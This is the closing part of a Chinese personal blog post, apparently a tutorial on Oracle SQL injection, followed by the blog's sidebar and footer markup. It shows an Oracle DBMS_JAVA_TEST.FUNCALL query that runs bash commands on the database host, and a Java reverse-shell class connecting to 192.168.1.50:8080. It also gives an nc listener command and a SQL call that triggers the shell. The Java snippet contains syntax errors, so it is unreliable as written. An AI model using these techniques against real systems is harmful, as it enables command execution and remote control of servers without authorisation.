+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="ln">1</span><span class="k">select</span> <span class="n">DBMS_JAVA_TEST</span><span class="p">.</span><span class="n">FUNCALL</span><span class="p">(</span><span class="s1">&#39;oracle/aurora/util/Wrapper&#39;</span><span class="p">,</span><span class="s1">&#39;main&#39;</span><span class="p">,</span><span class="s1">&#39;bin/bash&#39;</span><span class="p">,</span><span class="s1">&#39;-c&#39;</span><span class="p">,</span><span class="s1">&#39;pwd&gt;/tmp/pwd.txt&#39;</span><span class="p">)</span> <span class="k">from</span> <span class="n">dual</span><span class="p">;</span>	
+</code></pre></div><p>虽然输出格式报错，但实际命令执行成功。</p>
+<h3 id="反弹shell">反弹shell</h3>
+<p>JAVA源码：</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="ln"> 1</span><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+<span class="ln"> 2</span><span class="kn">import</span> <span class="nn">java.net.*</span><span class="o">;</span>
+<span class="ln"> 3</span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">shellRev</span>
+<span class="ln"> 4</span><span class="o">{</span>
+<span class="ln"> 5</span>	<span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[</span><span class="n">args</span><span class="o">)</span>
+<span class="ln"> 6</span>	<span class="o">{</span>
+<span class="ln"> 7</span>		<span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">1</span><span class="o">);</span>
+<span class="ln"> 8</span>		<span class="k">try</span><span class="o">{</span><span class="n">run</span><span class="o">();}</span>
+<span class="ln"> 9</span>		<span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){}</span>
+<span class="ln">10</span>	<span class="o">}</span>
+<span class="ln">11</span>	
+<span class="ln">12</span>	<span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span>
+<span class="ln">13</span>	<span class="o">{</span>
+<span class="ln">14</span>		<span class="n">String</span><span class="o">[]</span> <span class="n">aaa</span><span class="o">=[</span><span class="s">&#34;/bin/bash&#34;</span><span class="o">,</span><span class="s">&#34;-c&#34;</span><span class="o">,</span><span class="err">&#34;</span><span class="n">exec</span> <span class="n">9</span><span class="o">&lt;&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="n">192</span><span class="o">.</span><span class="na">168</span><span class="o">.</span><span class="na">1</span><span class="o">.</span><span class="na">50</span><span class="o">/</span><span class="n">8080</span><span class="o">;</span><span class="n">exec</span> <span class="n">0</span><span class="o">&lt;&amp;</span><span class="n">9</span><span class="o">;</span><span class="n">exec</span> <span class="n">1</span><span class="o">&gt;&amp;</span><span class="n">9</span> <span class="n">2</span><span class="o">&gt;&amp;</span><span class="n">1</span><span class="o">;/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="o">};</span>
+<span class="ln">15</span>		<span class="n">Process</span> <span class="n">p</span><span class="o">=</span><span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">aaa</span><span class="o">);</span>
+<span class="ln">16</span>	<span class="o">}</span>
+<span class="ln">17</span><span class="o">}</span>
+<span class="ln">18</span>
+<span class="ln">19</span>
+</code></pre></div><p>监听端口：</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>nc -vv -l -p 8080
+</code></pre></div><p>执行shell反弹：</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"><span class="ln">1</span>select sys.reversetcp from dual
+</code></pre></div></div><hr /><div class="post-navs d-flex mb-3 justify-content-between">
+  <div class="post-nav w-50"><div class="prev-post btn btn-sm">
+      <a href="/posts/tech/sql/">MySQL手工注入
+</a>
+    </div></div>
+  <div class="post-nav flex-row-reverse"><div class="next-post btn btn-sm">
+      <a href="/posts/tech/sql-2/">MSSQL注入
+</a>
+    </div></div>
+</div><section class="related-posts">
+    <h3>相关文章</h3>
+    <ul class="related-posts"><li><a href="/bin/subarashikihibi-1/">素晴日剧本片段
+</a></li><li><a href="/posts/tech/gal-extract/">记第一次从gal中解包提取素材和剧本
+</a></li><li><a href="/bin/free-talk/">杂谈——阿西莫夫的小说&amp;简奥斯汀所处的时代&amp;1984
+</a></li><li><a href="/posts/others/lighting-ball/">《球状闪电》
+</a></li><li><a href="/posts/others/stolz/">Stolz定理和一道例题
+</a></li></ul>
+  </section></article>
+
+
+
+
+<div id="vcomments" class="post-comments surface row">
+</div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            appId: '18xpdRPZMKmyTjmjtMIK8zyB-gzGzoHsz',
+            appKey: 'haH3Ysz9ic7RFcoqbIvPDh8H',
+            avatar:'retro',
+            visitor:true,
+            placeholder:'有什么想说的吗？'
+
+        });
+
+        var count = 0;
+        var domTimer = setInterval(function () {
+            if (++count > 50) clearInterval(domTimer);
+            if (document.querySelector('#veditor')) {
+                clearInterval(domTimer);
+                var cdraw = new CaveDraw({
+                    element: "#veditor",
+                    readOnlyMode: false, 
+                    afterUpdateEditor: ()=>{ 
+                        document.querySelector('#veditor').focus();
+                        document.querySelector('#veditor').blur();
+                    },
+                    controls: ['brush', 'eraser', 'bucket', 'clear', 'undo', 'redo', 'save']
+                });
+            }
+        }, 200);
+    </script></div>
+</div><aside class="col-lg-4 sidebar d-flex">
+  <div class="container"><section class="profile surface row">
+  <div class="col-xl-6 d-flex align-items-center justify-content-center">
+    <img class="profile-avatar img-fluid" src="/images/profile4.jpg" alt="リソウナジダイ" loading="lazy">
+  </div>
+  <div class="col-xl-6">
+    <h5 class="profile-name my-2">リソウナジダイ</h5><div class="profile-bio mb-2">バカです　何度もバカだって言ってるじゃないですか</div><div class="profile-company mb-2"><i class="fas fa-fw fa-building"></i>挣钱只为抽老婆</div><div class="profile-about mb-2"><i class="fas fa-fw fa-info-circle"></i><a  href="/about/">关于</a></div>
+      </div>
+</section><section class="recent-posts row surface">
+  <h4>最近文章</h4>
+  <ul><li><a href="/posts/tech/intranet-3/">Socket代理
+</a></li><li><a href="/posts/tech/intranet-2/">内网文件传输
+</a></li><li><a href="/posts/tech/shell/">反弹shell
+</a></li><li><a href="/posts/tech/linux/">Linux主机信息收集
+</a></li><li><a href="/posts/tech/windows-2/">域内凭据获取
+</a></li><li><a href="/posts/tech/intranet/">Windows内网信息收集
+</a></li><li><a href="/posts/tech/windows/">Windows密码凭证获取
+</a></li></ul>
+</section><section class="taxonomy-categories row surface">
+      <h4>
+        <a href="/categories">分类</a>
+      </h4>
+      <div><a href="/categories/%E4%BA%8C%E6%AC%A1%E5%85%83/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="二次元">
+          二次元 <span class="badge rounded-pill">23</span>
+        </a><a href="/categories/%E6%89%93%E6%80%AA%E5%8D%87%E7%BA%A7/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="打怪升级">
+          打怪升级 <span class="badge rounded-pill">23</span>
+        </a><a href="/categories/%E6%96%87%E5%AD%97%E7%B1%BB/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="文字类">
+          文字类 <span class="badge rounded-pill">6</span>
+        </a><a href="/categories/%E6%99%AE%E9%80%9A%E7%B1%BB/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="普通类">
+          普通类 <span class="badge rounded-pill">5</span>
+        </a><a href="/categories/%E8%AF%AD%E8%A8%80%E7%B1%BB/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="语言类">
+          语言类 <span class="badge rounded-pill">1</span>
+        </a></div>
+    </section><section class="taxonomy-series row surface">
+      <h4>
+        <a href="/series">专栏</a>
+      </h4>
+      <div><a href="/series/%E5%8A%A8%E6%BC%AB%E6%AD%8C%E6%9B%B2/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="动漫歌曲">
+          动漫歌曲 <span class="badge rounded-pill">21</span>
+        </a><a href="/series/galgame/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="Galgame">
+          Galgame <span class="badge rounded-pill">10</span>
+        </a><a href="/series/%E4%B9%A6%E7%B1%8D%E7%89%87%E6%AE%B5/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="书籍片段">
+          书籍片段 <span class="badge rounded-pill">6</span>
+        </a></div>
+    </section><section class="taxonomy-tags row surface">
+      <h4>
+        <a href="/tags">标签</a>
+      </h4>
+      <div><a href="/tags/kalafina/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="kalafina">
+          kalafina <span class="badge rounded-pill">5</span>
+        </a><a href="/tags/%E7%99%BD%E8%89%B2%E7%9B%B8%E7%B0%BF2/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="白色相簿2">
+          白色相簿2 <span class="badge rounded-pill">4</span>
+        </a><a href="/tags/%E7%A7%BD%E7%BF%BC%E7%9A%84%E5%B0%A4%E6%96%AF%E7%BC%87%E4%BA%9A/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="秽翼的尤斯缇亚">
+          秽翼的尤斯缇亚 <span class="badge rounded-pill">4</span>
+        </a><a href="/tags/%E9%AD%94%E6%B3%95%E5%B0%91%E5%A5%B3%E5%B0%8F%E5%9C%86/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="魔法少女小圆">
+          魔法少女小圆 <span class="badge rounded-pill">4</span>
+        </a><a href="/tags/%E7%99%BE%E5%B9%B4%E5%AD%A4%E7%8B%AC/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="百年孤独">
+          百年孤独 <span class="badge rounded-pill">3</span>
+        </a><a href="/tags/%E7%A9%BA%E4%B9%8B%E5%A2%83%E7%95%8C/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="空之境界">
+          空之境界 <span class="badge rounded-pill">3</span>
+        </a><a href="/tags/%E8%8B%B1%E5%9B%BD%E5%8F%B2/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="英国史">
+          英国史 <span class="badge rounded-pill">2</span>
+        </a><a href="/tags/fate/zero/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="fate/zero">
+          fate/zero <span class="badge rounded-pill">1</span>
+        </a><a href="/tags/magisk/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="magisk">
+          magisk <span class="badge rounded-pill">1</span>
+        </a><a href="/tags/%E5%8F%8D%E5%8F%9B%E7%9A%84%E9%B2%81%E8%B7%AF%E4%BF%AE/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="反叛的鲁路修">
+          反叛的鲁路修 <span class="badge rounded-pill">1</span>
+        </a><a href="/tags/%E5%B0%91%E5%A5%B3%E7%90%86%E8%AE%BA%E5%8F%8A%E5%85%B6%E5%91%A8%E8%BE%B9/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="少女理论及其周边">
+          少女理论及其周边 <span class="badge rounded-pill">1</span>
+        </a><a href="/tags/%E6%96%A9%E8%B5%A4%E7%B4%85%E4%B9%8B%E7%9E%B3/" class="post-taxonomy rounded btn btn-sm me-2 mb-2" title="斩·赤紅之瞳！">
+          斩·赤紅之瞳！ <span class="badge rounded-pill">1</span>
+        </a></div>
+    </section></div>
+</aside>
+</div>
+    </main><footer class="footer mt-auto py-3 text-center container"><nav class="social-links nav my-2 justify-content-center"></nav>
+<div class="copyright mb-2">
+  Copyright © 2021-2023 Unaybaryl. All Rights Reserved.
+</div>
+</footer>
+<a id="btnScrollToTop" class="btn-scroll-to-top">
+  <i class="fas fa-fw fa-chevron-circle-up fa-2x"></i>
+</a>
+
+
+
+              
+            </body>
+</html>
